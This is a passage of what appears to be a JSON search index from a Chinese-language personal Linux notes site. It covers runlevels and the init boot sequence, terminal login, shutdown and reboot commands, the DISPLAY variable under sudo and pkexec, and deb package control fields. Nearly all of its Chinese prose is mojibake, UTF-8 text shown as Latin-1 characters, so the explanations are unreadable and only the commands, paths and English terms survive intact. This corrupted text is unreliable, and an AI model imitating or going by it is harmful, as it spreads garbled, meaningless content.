initè¿›ç¨‹çš„ä¸€å¤§ä»»åŠ¡ï¼Œå°±æ˜¯å»è¿è¡Œè¿™äº›å¼€æœºå¯åŠ¨çš„ç¨‹åºã€‚ ä½†æ˜¯ï¼Œä¸åŒçš„åœºåˆéœ€è¦å¯åŠ¨ä¸åŒçš„ç¨‹åºï¼Œæ¯”å¦‚ç”¨ä½œæœåŠ¡å™¨æ—¶ï¼Œéœ€è¦å¯åŠ¨Apacheï¼Œç”¨ä½œæ¡Œé¢å°±ä¸éœ€è¦ã€‚ Linuxå…è®¸ä¸ºä¸åŒçš„åœºåˆï¼Œåˆ†é…ä¸åŒçš„å¼€æœºå¯åŠ¨ç¨‹åºï¼Œè¿™å°±å«åš\"è¿è¡Œçº§åˆ«\"ï¼ˆrunlevelï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯åŠ¨æ—¶æ ¹æ®\"è¿è¡Œçº§åˆ«\"ï¼Œç¡®å®šè¦è¿è¡Œå“ªäº›ç¨‹åºã€‚ æŸ¥çœ‹å½“å‰è¿è¡Œçº§åˆ«å¯ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/runlevel Linuxç³»ç»Ÿæœ‰7ä¸ªè¿è¡Œçº§åˆ«(runlevel), ä¹Ÿå°±æ˜¯initæŒ‡ä»¤æ”¯æŒçš„å‚æ•°ï¼š è¿è¡Œçº§åˆ«0ï¼šç³»ç»ŸåœæœºçŠ¶æ€ï¼Œç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º0ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ è¿è¡Œçº§åˆ«1ï¼šå•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œrootæƒé™ï¼Œç”¨äºç³»ç»Ÿç»´æŠ¤ï¼Œç¦æ­¢è¿œç¨‹ç™»å½• è¿è¡Œçº§åˆ«2ï¼šå¤šç”¨æˆ·çŠ¶æ€(æ²¡æœ‰NFS) è¿è¡Œçº§åˆ«3ï¼šå®Œå…¨çš„å¤šç”¨æˆ·çŠ¶æ€(æœ‰NFS)ï¼Œç™»å½•åè¿›å…¥æ§åˆ¶å°å‘½ä»¤è¡Œæ¨¡å¼ è¿è¡Œçº§åˆ«4ï¼šç³»ç»Ÿæœªä½¿ç”¨ï¼Œä¿ç•™ è¿è¡Œçº§åˆ«5ï¼šX11æ§åˆ¶å°ï¼Œç™»å½•åè¿›å…¥å›¾å½¢GUIæ¨¡å¼ è¿è¡Œçº§åˆ«6ï¼šç³»ç»Ÿæ­£å¸¸å…³é—­å¹¶é‡å¯ï¼Œé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º6ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ ç³»ç»Ÿåˆå§‹åŒ– åœ¨initçš„é…ç½®æ–‡ä»¶ä¸­æœ‰è¿™ä¹ˆä¸€è¡Œ: si::sysinit:/etc/rc.d/rc.sysinit å®ƒè°ƒç”¨æ‰§è¡Œäº†/etc/rc.d/rc.sysinitï¼Œè€Œrc.sysinitæ˜¯ä¸€ä¸ªbash shellçš„è„šæœ¬ï¼Œ å®ƒä¸»è¦æ˜¯å®Œæˆä¸€äº›ç³»ç»Ÿåˆå§‹åŒ–çš„å·¥ä½œï¼Œrc.sysinitæ˜¯æ¯ä¸€ä¸ªè¿è¡Œçº§åˆ«éƒ½è¦é¦–å…ˆè¿è¡Œçš„é‡è¦è„šæœ¬ã€‚ å®ƒä¸»è¦å®Œæˆçš„å·¥ä½œæœ‰: æ¿€æ´»äº¤æ¢åˆ†åŒº æ£€æŸ¥ç£ç›˜ åŠ è½½ç¡¬ä»¶æ¨¡å— ä¸€äº›éœ€è¦ä¼˜å…ˆæ‰§è¡Œä»»åŠ¡ã€‚ å¦‚ä¸‹é¢çš„å†…å®¹: l5:5:wait:/etc/rc.d/rc 5 è¡¨ç¤ºä»¥5ä¸ºå‚æ•°è¿è¡Œ/etc/rc.d/rcï¼Œ/etc/rc.d/rcæ˜¯ä¸€ä¸ªShellè„šæœ¬ï¼Œå®ƒæ¥å—5ä½œä¸ºå‚æ•°ï¼Œ å»æ‰§è¡Œ/etc/rc.d/rc5.d/ç›®å½•ä¸‹çš„æ‰€æœ‰çš„rcå¯åŠ¨è„šæœ¬ï¼Œ/etc/rc.d/rc5.d/ç›®å½•ä¸­çš„è¿™äº›å¯åŠ¨è„šæœ¬å®é™…ä¸Šéƒ½æ˜¯ä¸€äº›è¿æ¥æ–‡ä»¶ï¼Œ è€Œä¸æ˜¯çœŸæ­£çš„rcå¯åŠ¨è„šæœ¬ï¼ŒçœŸæ­£çš„rcå¯åŠ¨è„šæœ¬å®é™…ä¸Šéƒ½æ˜¯æ”¾åœ¨/etc/rc.d/init.d/ç›®å½•ä¸‹ã€‚ è€Œè¿™äº›rcå¯åŠ¨è„šæœ¬æœ‰ç€ç±»ä¼¼çš„ç”¨æ³•ï¼Œå®ƒä»¬ä¸€èˆ¬èƒ½æ¥å—startã€stopã€restartã€statusç­‰å‚æ•°ã€‚ /etc/rc.d/rc5.d/ä¸­çš„rcå¯åŠ¨è„šæœ¬é€šå¸¸æ˜¯Kæˆ–Så¼€å¤´çš„è¿æ¥æ–‡ä»¶ï¼Œå¯¹äºä»¥ S å¼€å¤´çš„å¯åŠ¨è„šæœ¬ï¼Œå°†ä»¥startå‚æ•°æ¥è¿è¡Œã€‚ è€Œå¦‚æœå‘ç°å­˜åœ¨ç›¸åº”çš„è„šæœ¬ä¹Ÿå­˜åœ¨Kæ‰“å¤´çš„è¿æ¥ï¼Œè€Œä¸”å·²ç»å¤„äºè¿è¡Œæ€äº†(ä»¥/var/lock/subsys/ä¸‹çš„æ–‡ä»¶ä½œä¸ºæ ‡å¿—)ï¼Œ åˆ™å°†é¦–å…ˆä»¥stopä¸ºå‚æ•°åœæ­¢è¿™äº›å·²ç»å¯åŠ¨äº†çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œç„¶åå†é‡æ–°è¿è¡Œã€‚ è¿™æ ·åšæ˜¯ä¸ºäº†ä¿è¯æ˜¯å½“initæ”¹å˜è¿è¡Œçº§åˆ«æ—¶ï¼Œæ‰€æœ‰ç›¸å…³çš„å®ˆæŠ¤è¿›ç¨‹éƒ½å°†é‡å¯ã€‚ è‡³äºåœ¨æ¯ä¸ªè¿è¡Œçº§ä¸­å°†è¿è¡Œå“ªäº›å®ˆæŠ¤è¿›ç¨‹ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡chkconfigæˆ–setupä¸­çš„\"System Services\"æ¥è‡ªè¡Œè®¾å®šã€‚ å»ºç«‹ç»ˆç«¯ rcæ‰§è¡Œå®Œæ¯•åï¼Œè¿”å›initã€‚è¿™æ—¶åŸºæœ¬ç³»ç»Ÿç¯å¢ƒå·²ç»è®¾ç½®å¥½äº†ï¼Œå„ç§å®ˆæŠ¤è¿›ç¨‹ä¹Ÿå·²ç»å¯åŠ¨äº†ã€‚ initæ¥ä¸‹æ¥ä¼šæ‰“å¼€6ä¸ªç»ˆç«¯ï¼Œä»¥ä¾¿ç”¨æˆ·ç™»å½•ç³»ç»Ÿã€‚åœ¨inittabä¸­çš„ä»¥ä¸‹6è¡Œå°±æ˜¯å®šä¹‰äº†6ä¸ªç»ˆç«¯: 1:2345:respawn:/sbin/mingetty tty1 2:2345:respawn:/sbin/mingetty tty2 3:2345:respawn:/sbin/mingetty tty3 4:2345:respawn:/sbin/mingetty tty4 5:2345:respawn:/sbin/mingetty tty5 6:2345:respawn:/sbin/mingetty tty6 ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºåœ¨2ã€3ã€4ã€5çš„è¿è¡Œçº§åˆ«ä¸­éƒ½å°†ä»¥respawnæ–¹å¼è¿è¡Œmingettyç¨‹åºï¼Œmingettyç¨‹åºèƒ½æ‰“å¼€ç»ˆç«¯ã€è®¾ç½®æ¨¡å¼ã€‚ åŒæ—¶å®ƒä¼šæ˜¾ç¤ºä¸€ä¸ªæ–‡æœ¬ç™»å½•ç•Œé¢ï¼Œè¿™ä¸ªç•Œé¢å°±æ˜¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„ç™»å½•ç•Œé¢ï¼Œåœ¨è¿™ä¸ªç™»å½•ç•Œé¢ä¸­ä¼šæç¤ºç”¨æˆ·è¾“å…¥ç”¨æˆ·åï¼Œ è€Œç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·å°†ä½œä¸ºå‚æ•°ä¼ ç»™loginç¨‹åºæ¥éªŒè¯ç”¨æˆ·çš„èº«ä»½ã€‚ ç”¨æˆ·ç™»å½•ç³»ç»Ÿ ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·çš„ç™»å½•æ–¹å¼æœ‰ä¸‰ç§ï¼š å‘½ä»¤è¡Œç™»å½• sshç™»å½• å›¾å½¢ç•Œé¢ç™»å½• å¯¹äºè¿è¡Œçº§åˆ«ä¸º5çš„å›¾å½¢æ–¹å¼ç”¨æˆ·æ¥è¯´ï¼Œä»–ä»¬çš„ç™»å½•æ˜¯é€šè¿‡ä¸€ä¸ªå›¾å½¢åŒ–çš„ç™»å½•ç•Œé¢ã€‚ç™»å½•æˆåŠŸåå¯ä»¥ç›´æ¥è¿›å…¥ KDEã€Gnome ç­‰çª—å£ç®¡ç†å™¨ã€‚ è€Œæœ¬æ–‡ä¸»è¦è®²çš„è¿˜æ˜¯æ–‡æœ¬æ–¹å¼ç™»å½•çš„æƒ…å†µï¼šå½“æˆ‘ä»¬çœ‹åˆ°mingettyçš„ç™»å½•ç•Œé¢æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¾“å…¥ç”¨æˆ·åå’Œå¯†ç æ¥ç™»å½•ç³»ç»Ÿäº†ã€‚ Linux çš„è´¦å·éªŒè¯ç¨‹åºæ˜¯ loginï¼Œlogin ä¼šæ¥æ”¶ mingetty ä¼ æ¥çš„ç”¨æˆ·åä½œä¸ºç”¨æˆ·åå‚æ•°ã€‚ ç„¶å login ä¼šå¯¹ç”¨æˆ·åè¿›è¡Œåˆ†æï¼šå¦‚æœç”¨æˆ·åä¸æ˜¯ rootï¼Œä¸”å­˜åœ¨ /etc/nologin æ–‡ä»¶ï¼Œlogin å°†è¾“å‡º nologin æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åé€€å‡ºã€‚ è¿™é€šå¸¸ç”¨æ¥ç³»ç»Ÿç»´æŠ¤æ—¶é˜²æ­¢érootç”¨æˆ·ç™»å½•ã€‚åªæœ‰/etc/securettyä¸­ç™»è®°äº†çš„ç»ˆç«¯æ‰å…è®¸ root ç”¨æˆ·ç™»å½•ï¼Œå¦‚æœä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œ åˆ™ root ç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•ç»ˆç«¯ä¸Šç™»å½•ã€‚ /etc/userttyæ–‡ä»¶ç”¨äºå¯¹ç”¨æˆ·ä½œå‡ºé™„åŠ è®¿é—®é™åˆ¶ï¼Œå¦‚æœä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œåˆ™æ²¡æœ‰å…¶ä»–é™åˆ¶ã€‚ å›¾å½¢æ¨¡å¼ä¸æ–‡å­—æ¨¡å¼çš„åˆ‡æ¢æ–¹å¼ Linuxé¢„è®¾æä¾›äº†å…­ä¸ªå‘½ä»¤çª—å£ç»ˆç«¯æœºè®©æˆ‘ä»¬æ¥ç™»å½•ã€‚ é»˜è®¤æˆ‘ä»¬ç™»å½•çš„å°±æ˜¯ç¬¬ä¸€ä¸ªçª—å£ï¼Œä¹Ÿå°±æ˜¯tty1ï¼Œè¿™ä¸ªå…­ä¸ªçª—å£åˆ†åˆ«ä¸ºtty1,tty2 â€¦ tty6ï¼Œå³ å»ºç«‹ç»ˆç«¯ éƒ¨åˆ†ä»‹ç»çš„å…­ä¸ªç»ˆç«¯ ä½ å¯ä»¥æŒ‰ä¸‹Ctrl + Alt + F1 ~ F6 æ¥åˆ‡æ¢å®ƒä»¬ã€‚ å¦‚æœä½ å®‰è£…äº†å›¾å½¢ç•Œé¢ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯è¿›å…¥å›¾å½¢ç•Œé¢çš„ï¼Œæ­¤æ—¶ä½ å°±å¯ä»¥æŒ‰Ctrl + Alt + F1 ~ F6æ¥è¿›å…¥å…¶ä¸­ä¸€ä¸ªå‘½ä»¤çª—å£ç•Œé¢ã€‚ å½“ä½ è¿›å…¥å‘½ä»¤çª—å£ç•Œé¢åå†è¿”å›å›¾å½¢ç•Œé¢åªè¦æŒ‰ä¸‹Ctrl + Alt + F7 å°±å›æ¥äº†ã€‚ å¦‚æœä½ ç”¨çš„ vmware è™šæ‹Ÿæœº ï¼Œå‘½ä»¤çª—å£åˆ‡æ¢çš„å¿«æ·é”®ä¸º Alt + Space + F1~F6. å¦‚æœä½ åœ¨å›¾å½¢ç•Œé¢ä¸‹è¯·æŒ‰Alt + Shift + Ctrl + F1~F6 åˆ‡æ¢è‡³å‘½ä»¤çª—å£ã€‚ Linuxå¯åŠ¨åŠ è½½é¡ºåºå›¾ä¾‹ Linux å…³æœº åœ¨linuxé¢†åŸŸå†…å¤§å¤šç”¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¾ˆå°‘é‡åˆ°å…³æœºçš„æ“ä½œã€‚æ¯•ç«ŸæœåŠ¡å™¨ä¸Šè·‘ä¸€ä¸ªæœåŠ¡æ˜¯æ°¸æ— æ­¢å¢ƒçš„ï¼Œé™¤éç‰¹æ®Šæƒ…å†µä¸‹ï¼Œä¸å¾—å·²æ‰ä¼šå…³æœºã€‚ æ­£ç¡®çš„å…³æœºæµç¨‹ä¸º: sync > shutdown > reboot > halt å…³æœºå¯ä½¿ç”¨çš„æŒ‡ä»¤: init 0 shutdown â€“h now halt poweroff é‡å¯å¯ä½¿ç”¨çš„æŒ‡ä»¤: shutdown â€“r now reboot init 6 å…³æœºæŒ‡ä»¤ä¸ºï¼šshutdown ï¼Œä½ å¯ä»¥man shutdown æ¥çœ‹ä¸€ä¸‹å¸®åŠ©æ–‡æ¡£ã€‚ ä¾‹å¦‚ä½ å¯ä»¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤å…³æœº, å…ˆå­˜æ•°æ®: sync å°†æ•°æ®ç”±å†…å­˜åŒæ­¥åˆ°ç¡¬ç›˜ä¸­ æ‰§è¡Œshutdown å…³æœºæŒ‡ä»¤ï¼Œä¾‹å¦‚ä½ å¯ä»¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤å…³æœº: shutdown â€“h 10 â€˜This server will shutdown after 10 mins' è®¡ç®—æœºå°†åœ¨10åˆ†é’Ÿåå…³æœºï¼Œå¹¶ä¸”ä¼šæ˜¾ç¤ºåœ¨ç™»é™†ç”¨æˆ·çš„å½“å‰å±å¹•ä¸­ã€‚ shutdown â€“h now ç«‹é©¬å…³æœº shutdown â€“h 20:25 ç³»ç»Ÿä¼šåœ¨ä»Šå¤©20:25å…³æœº shutdown â€“h +10 ååˆ†é’Ÿåå…³æœº shutdown â€“r now ç³»ç»Ÿç«‹é©¬é‡å¯ shutdown â€“r +10 ç³»ç»Ÿååˆ†é’Ÿåé‡å¯ æˆ–è€…reboot å°±æ˜¯é‡å¯ï¼Œç­‰åŒäº shutdown â€“r now: reboot æˆ–è€… halt å…³é—­ç³»ç»Ÿï¼Œç­‰åŒäºshutdown â€“h now å’Œ poweroff: halt","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-startup-process-of-the-Linux-system.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-startup-process-of-the-Linux-system.html"},{"title":"ç»ˆç«¯ tty consoleåŒºåˆ«","text":"å†²æµªçœ‹åˆ°çš„: https://www.zhihu.com/question/21711307/answer/2231006377 è‹¥æ— äº†å¯è§pdf: ../../../../resources/pdf/ç»ˆç«¯ã€Shellã€tty å’Œæ§åˆ¶å°ï¼ˆconsoleï¼‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ - çŸ¥ä¹.pdf","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Ty-Console-difference-between-terminals.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Ty-Console-difference-between-terminals.html"},{"title":"Linuxä¸‹DISPLAYä½œç”¨","text":"DISPLAYç”¨æ¥è®¾ç½®å°†å›¾å½¢æ˜¾ç¤ºåˆ°ä½•å¤„, æˆ–è€…è¯´è®¾ç½®æˆ–æ˜¾ç¤ºå½“å‰çš„æ˜¾ç¤ºç¯å¢ƒ (æŒ‡å®šXæœåŠ¡å™¨çš„ç°å®è®¾å¤‡) æ ¼å¼: hostname:display.number.screen.number hostnameè¡¨ç¤ºè¿è¡ŒXæœåŠ¡å™¨çš„ä¸»æœºåæˆ–IPåœ°å€ display.numberè¡¨ç¤ºXæœåŠ¡å™¨çš„ç¼–å· screen.numberè¡¨ç¤ºå±å¹•çš„ç¼–å· é»˜è®¤å€¼: å½“ä½ åœ¨ç»ˆç«¯ä¸­å¯åŠ¨XæœåŠ¡å™¨æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è®¾ç½®DISPLAYç¯å¢ƒå˜é‡çš„å€¼ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œé»˜è®¤å€¼ä¸º:0.0ï¼Œè¡¨ç¤ºä½¿ç”¨æœ¬åœ°ä¸»æœºä¸Šçš„ç¬¬ä¸€ä¸ªXæœåŠ¡å™¨å’Œç¬¬ä¸€ä¸ªå±å¹•ã€‚ æ˜¾ç¤ºå½“å‰çš„æ˜¾ç¤ºç¯å¢ƒ: echo $DISPLAY ä¸€äº›å¸¸è§ä½¿ç”¨ è®¾ç½®æ˜¾ç¤ºç¯å¢ƒ è®¾ç½®æ˜¾ç¤ºç¯å¢ƒä¸ºæœ¬åœ°æ˜¾ç¤ºå™¨: export DISPLAY=:0 è®¾ç½®æ˜¾ç¤ºç¯å¢ƒä¸ºç¬¬äºŒä¸ªæœ¬åœ°æ˜¾ç¤ºå™¨: export DISPLAY=:1 è®¾ç½®æ˜¾ç¤ºç¯å¢ƒä¸ºipåœ°å€çš„ç¬¬ä¸€æ˜¾ç¤ºå™¨: export DISPLAY=ip:0 æ§åˆ¶X11ç¨‹åºåœ¨å“ªä¸ªæ˜¾ç¤ºå™¨ä¸Šå¯åŠ¨ å½“è®¾ç½®äº†displayå˜é‡å,å¯åŠ¨çš„X11ç¨‹åºé»˜è®¤ä¼šåœ¨è¯¥æ˜¾ç¤ºç¯å¢ƒæ‰“å¼€ã€‚ ä¾‹å¦‚, åœ¨ç¬¬äºŒä¸ªæ˜¾ç¤ºå™¨ä¸Šå¯åŠ¨xterm: export DISPLAY=:1 xterm è¿è¡Œè¿œç¨‹ç¨‹åº åœ¨æœ¬åœ°æ˜¾ç¤ºè¿œç¨‹linuxæœåŠ¡å™¨ä¸Šçš„å›¾å½¢ç•Œé¢ç¨‹åº: ssh -X remote_server export DISPLAY=localhost:0.0 # è®¾ç½®è¿œç¨‹æ˜¾ç¤ºç¯å¢ƒä¸ºæœ¬åœ°æ˜¾ç¤ºå™¨ xterm # è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„xtermå°†æ˜¾ç¤ºåœ¨æœ¬åœ°æ˜¾ç¤ºå™¨ä¸Š ç‰¹æ®Šæƒ…å†µ, ææƒåçš„å˜åŒ– ä¸»è¦é’ˆå¯¹ä½¿ç”¨ sudo, su, pkexec è¿™ç±»æŒ‡ä»¤. è®¾å®šå½“å‰ç™»å½•æ™®é€šç”¨æˆ·ä¸º bob æµ‹è¯•æœºå™¨, ubuntu20 åœºæ™¯1: ä½¿ç”¨ sudo su åˆ‡æ¢root æ•ˆæœæ˜¯åˆ‡åˆ°åˆ°äº†root, ä»…ä¿ç•™äº†æœ€åˆç”¨æˆ·(åˆ‡æ¢æ—¶ä½¿ç”¨çš„ç”¨æˆ·bob)çš„ç¯å¢ƒå˜é‡. è¿™ä¸ªæ—¶å€™, DISPLAYçš„å€¼æ²¡æœ‰å˜åŒ– åœºæ™¯2: ä½¿ç”¨ sudo su - åˆ‡æ¢root æ•ˆæœæ˜¯åˆ‡åˆ°åˆ°äº†root, åŒæ—¶åŠ è½½rootç¯å¢ƒå˜é‡. è¿™ä¸ªæ—¶å€™, DISPLAYçš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²(rootç¯å¢ƒå˜é‡æ²¡æœ‰æŒ‡å®šæ—¶) åœºæ™¯3: ä½¿ç”¨ pkexec <cmd> åˆ‡æ¢root æ•ˆæœæ˜¯åªèƒ½ä»¥rootèº«ä»½æ‰§è¡Œå½“æ¬¡cmd, ä¼šä¿ç•™ç”¨æˆ·bobçš„ DISPLAY å€¼, ä½†æ˜¯, ä½¿ç”¨çš„è¿™ä¸ªDISPLAYç•Œé¢æ˜¯å—é™åˆ¶çš„, pkexecå¯åŠ¨çš„å›¾å½¢ç¨‹åºä¼šåœ¨ä¸€ä¸ªçº¯å‡€å’Œå—é™çš„X sessionä¸‹è¿è¡Œ å®é™…åœºæ™¯: pkexec + sudo å®é™…çš„åº”ç”¨åœºæ™¯å°±æ˜¯ pkexec çš„ cmd åšäº†ä¸€äº›æ“ä½œå, å¯åŠ¨å›¾å½¢ç•Œé¢ æ—¶(æ¯”å¦‚å­˜åœ¨SDLä¾èµ–), éœ€è¦ä»¥bobçš„èº«ä»½å¯åŠ¨: pkexec bash -c \"xxx; sudo -u bob start_app\" è¿™ä¸ªæ—¶å€™å°±æŠ¥é”™: failed to initialize SDL: No available video device è™½ç„¶pkexecä¼šä¿ç•™, ä½†æ˜¯æ•ˆæœè²Œä¼¼è¿˜æ˜¯è¡Œ, éœ€è¦åœ¨pkexecä¹‹å‰æ‰‹åŠ¨é‡ç½®: pkexec bash -c \"export DISPLAY=$DISPLAY; sudo -u bob start_app\" # pkexec bash -c \"env DISPLAY=$DISPLAY sudo -u bob start_app\" è„šæœ¬ä¸­ä½¿ç”¨ export DISPLAY æˆ– env DISPLAY , ä¸€ç›´ä¼šå‡ºç°exportè¿™ä¸€æ­¥å¡ä½çš„é—®é¢˜, æš‚æ—¶æ²¡æœ‰æ‰¾åˆ°åŸå› . ä¸æ’é™¤æ˜¯ pkexec ä½¿ç”¨äº†ä¸€äº›å®‰å…¨æœºåˆ¶æ¥éš”ç¦»å’Œé™åˆ¶å¯åŠ¨è¿›ç¨‹çš„æƒé™, å¦‚å¯¹ç¯å¢ƒå˜é‡çš„ä¿®æ”¹, å¯¼è‡´ export è¿™ä¸€æ­¥ä¼šæ°¸è¿œç­‰å¾… ,çœ‹èµ·æ¥å°±åƒå¡ä½äº†ä¸€æ ·. ä½†æ˜¯ç›´æ¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œåˆä¸ä¼šå¡, å°±å¾ˆæ‡µ. ä¸”ä¸exportæˆ–è€…ä¸envæ—¶å€™, æ‰“å°å‡ºçš„ DISPLAY å€¼æ˜¯æ­£ç¡®çš„, å¿…é¡»å¾—æ˜¾ç¤ºè®¾ç½®ä¸€ä¸‹, æ‰èƒ½æ­£å¸¸å¯åŠ¨(æˆ‘è¿™é‡Œæ˜¯å¯åŠ¨çš„SDL). è€ŒåŒäº‹çš„ ubuntu18 åˆæ²¡æœ‰è¿™ä¸ªé—®é¢˜... åˆå°è¯•äº†ä¸€ä¸‹, å‘ç°ç›´æ¥: pkexec bash xxx.sh è€Œ xxx.sh å†…éƒ¨æ˜¯è¯»ä¸åˆ° DISPLAY çš„å€¼çš„. å¡çš„åŸå› ä¹Ÿæ‰¾åˆ°äº†, è„šæœ¬åŠ äº†: set -eu å› ä¸ºæ²¡æœ‰å®šä¹‰ DISPLAY , æ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™ç›´æ¥é€€å‡ºäº†(-u) æ³¨è§£ è¿™é‡Œæ²¡ææ‡‚æ˜¯æ ¹æ®ä»€ä¹ˆæ¥åˆ¤æ–­å—é™çš„, è¯•è¿‡ä¸é‡ç½®, å­è¿›ç¨‹ä¹Ÿèƒ½æ­£å¸¸è·å–åˆ°DISPLAY. ä¸ºä»€ä¹ˆexportèƒ½æ¸…é™¤æ‰å—é™çŠ¶æ€.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Disch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Disch.html"},{"title":"æœ¬åœ°æ„å»ºdebåŒ…","text":"debianå®˜æ–¹æ–‡æ¡£: https://www.debian.org/releases/stable/amd64/index.zh-cn.html controlæ–‡ä»¶è¯´æ˜: https://www.debian.org/doc/debian-policy/ch-controlfields.html æ–‡ä»¶ç»“æ„ DEBIAN ä¸‹çš„è¿™äº›æ–‡ä»¶, å®‰è£…åä¸€èˆ¬éƒ½å¯ä»¥åœ¨ /var/lib/info ä¸‹æ‰¾åˆ°, å¦‚ /var/lib/info/xxx.prerm* å¤§æ¦‚åŒ…ç›®å½•ç»“æ„å¦‚ä¸‹: |----DEBIAN |-------control |-------postinst(postinstallation) |-------postrm(postremove) |-------preinst(preinstallation) |-------prerm(preremove) |-------copyright(ç‰ˆæƒ) |-------changlog(ä¿®è®¢è®°å½•) |-------conffiles |----etc |----usr |----opt |----tmp |----boot |-----initrd-vstools.img DEBIAN ä¸‹çš„æ–‡ä»¶å¤§å¤šéƒ½éœ€è¦å¯æ‰§è¡Œæƒé™ controlæ–‡ä»¶ å®˜æ–¹å­—æ®µè¯´æ˜è§: https://www.debian.org/doc/debian-policy/ch-controlfields.html debåŒ…å¿…é¡»å…·å¤‡çš„æè¿°æ€§æ–‡ä»¶ï¼Œä»¥ä¾¿äºè½¯ä»¶çš„å®‰è£…ç®¡ç†å’Œç´¢å¼• å†…å®¹å­—æ®µè¯´æ˜ Package ç¨‹åºåç§° ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼ Version ç‰ˆæœ¬ Section è½¯ä»¶ç±»åˆ« utils, net, mail, text, x11 Priority è½¯ä»¶å¯¹äºç³»ç»Ÿçš„é‡è¦ç¨‹åº¦ required, standard, optional, extraç­‰ Essential æ˜¯å¦æ˜¯ç³»ç»Ÿæœ€åŸºæœ¬çš„è½¯ä»¶åŒ… yes/noï¼Œè‹¥ä¸ºyes,åˆ™ä¸å…è®¸å¸è½½ï¼ˆé™¤éå¼ºåˆ¶æ€§å¸è½½ï¼‰ Architecture è½¯ä»¶æ‰€æ”¯æŒçš„å¹³å°æ¶æ„ all, i386, amd64, m68k, sparc, alpha, powerpcç­‰, æ”¯æŒçš„æ¶æ„å¯å‚è€ƒ: https://www.debian.org/releases/stable/amd64/ch02s01.zh-cn.html Source è½¯ä»¶åŒ…çš„æºä»£ç åç§° Depends è½¯ä»¶æ‰€ä¾èµ–çš„å…¶ä»–è½¯ä»¶åŒ…å’Œåº“æ–‡ä»¶ è‹¥ä¾èµ–å¤šä¸ªè½¯ä»¶åŒ…å’Œåº“æ–‡ä»¶ï¼Œé‡‡ç”¨é€—å·éš”å¼€ Pre-Depends è½¯ä»¶å®‰è£…å‰å¿…é¡»å®‰è£…ã€é…ç½®ä¾èµ–æ€§çš„è½¯ä»¶åŒ…å’Œåº“æ–‡ä»¶ å¸¸ç”¨äºå¿…é¡»çš„é¢„è¿è¡Œè„šæœ¬éœ€æ±‚ Recommends æ¨èå®‰è£…çš„å…¶ä»–è½¯ä»¶åŒ…å’Œåº“æ–‡ä»¶ Suggests å»ºè®®å®‰è£…çš„å…¶ä»–è½¯ä»¶åŒ…å’Œåº“æ–‡ä»¶ Maintainer ç»´æŠ¤è€… Description ç¨‹åºè¯´æ˜ Homepage ä¸»é¡µ Installed-Size: å®‰è£…å¤§æ¦‚æ¶ˆè€—çš„ç©ºé—´(é¢„ä¼°å€¼, å®é™…å¯èƒ½æœ‰æ‰€ä¸åŒ), åªå†™æ•°å­—å³å¯, å•ä½å­—èŠ‚ Download-Size: å¤§å°éœ€è¦ä¸‹è½½çš„åŒ…çš„å¤§å°, åªå†™æ•°å­—å¤§å°å³å¯, å•ä½å­—èŠ‚ MimeType: å…³è”çš„æ–‡ä»¶ç±»å‹, æ¯”å¦‚vscodeè®¾ç½®äº† inode/directory å°±å¯ä»¥å³é”®é€‰æ‹©å…¶ä»–åº”ç”¨æ‰“å¼€çš„æ—¶å€™æœ‰vscode MimeTypeæ”¯æŒçš„éƒ¨åˆ†ç±»å‹: inode/directoryï¼šæ™®é€šæ–‡ä»¶å¤¹ text/plain: æ–‡æœ¬æ–‡ä»¶ application/x-gnome-saved-searchï¼šGNOME æ¡Œé¢ç¯å¢ƒä¸­ä¿å­˜çš„æœç´¢ç»“æœæ–‡ä»¶å¤¹ inode/mount-pointï¼šæŒ‚è½½ç‚¹ï¼Œè¡¨ç¤ºä¸€ä¸ªå·²æŒ‚è½½çš„è®¾å¤‡æˆ–æ–‡ä»¶ç³»ç»Ÿ inode/blockdeviceï¼šå—è®¾å¤‡æ–‡ä»¶å¤¹ inode/chardeviceï¼šå­—ç¬¦è®¾å¤‡æ–‡ä»¶å¤¹ inode/socketï¼šå¥—æ¥å­—æ–‡ä»¶å¤¹ inode/fifoï¼šå‘½åç®¡é“æ–‡ä»¶å¤¹ application/Xcode-workspace: xcodeé¡¹ç›®, ä¸»è¦æ˜¯è‹¹æœä¸‹é¢çš„ postinstæ–‡ä»¶ 